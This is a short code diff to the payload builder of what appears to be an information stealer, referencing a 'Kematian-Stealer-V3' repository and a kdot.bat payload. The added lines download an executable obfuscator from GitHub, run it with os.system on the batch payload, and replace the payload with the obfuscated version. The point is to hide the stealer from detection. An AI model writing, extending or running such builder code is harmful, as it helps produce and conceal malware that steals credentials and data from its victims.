@@ -1,3 +1,5 @@
+import os
+
 import requests
 
 
@@ -82,6 +84,21 @@ class BuildPayload:
 
         with open("kdot.bat", "w", newline="") as f:
             f.write(content)
+
+        if options["obfuscate"]:
+            somalifuscator_url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"
+
+            r = requests.get(somalifuscator_url, allow_redirects=True)
+
+            with open("somalifuscator.exe", "wb") as f:
+                f.write(r.content)
+
+            os.system("somalifuscator.exe -f kdot.bat")
+
+            os.remove("somalifuscator.exe")
+            os.remove("kdot.bat")
+
+            os.rename("kdot_obf.bat", "kdot.bat")
 
     def build_ps1(self, url: str, options: dict[str, bool]) -> None:
         github_raw_url_ps1 = "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer-V3/main/frontend-src/main.ps1"
